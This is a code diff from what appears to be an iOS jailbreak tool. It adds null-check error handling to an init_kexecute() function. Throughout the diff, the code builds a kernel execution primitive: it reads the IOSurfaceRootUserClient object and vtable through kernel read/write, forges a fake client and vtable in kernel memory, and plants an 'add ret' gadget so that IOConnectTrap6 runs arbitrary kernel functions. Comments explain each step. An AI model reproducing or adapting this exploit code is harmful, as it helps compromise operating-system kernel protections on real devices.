@@ -35,21 +35,26 @@ static uint64_t fake_vtable;
 static uint64_t fake_client;
 const int fake_kalloc_size = 0x1000;
 
-void init_kexecute() {
+bool init_kexecute() {
     user_client = prepare_user_client();
+    if (!user_client) return false;
     
     // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
     IOSurfaceRootUserClient_port = find_port(user_client); // UserClients are just mach_ports, so we find its address
+    if (!IOSurfaceRootUserClient_port) return false;
     
     IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject); // The UserClient itself (the C++ object) is at the kobject field
+    if (!IOSurfaceRootUserClient_addr) return false;
     
     uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
+    if (!IOSurfaceRootUserClient_vtab) return false;
     
     // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
     // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
     
     // Create the vtable in the kernel memory, then copy the existing vtable into there
     fake_vtable = kalloc(fake_kalloc_size);
+    if (!fake_vtable) return false;
     
     for (int i = 0; i < 0x200; i++) {
         wk64(fake_vtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
@@ -57,6 +62,7 @@ void init_kexecute() {
     
     // Create the fake user client
     fake_client = kalloc(fake_kalloc_size);
+    if (!fake_client) return false;
     
     for (int i = 0; i < 0x200; i++) {
         wk64(fake_client+i*8, rk64(IOSurfaceRootUserClient_addr+i*8));
@@ -74,6 +80,7 @@ void init_kexecute() {
     wk64(fake_vtable+8*0xB7, offset_add_ret_gadget);
     
     pthread_mutex_init(&kexecute_lock, NULL);
+    return true;
 }
 
 void term_kexecute() {
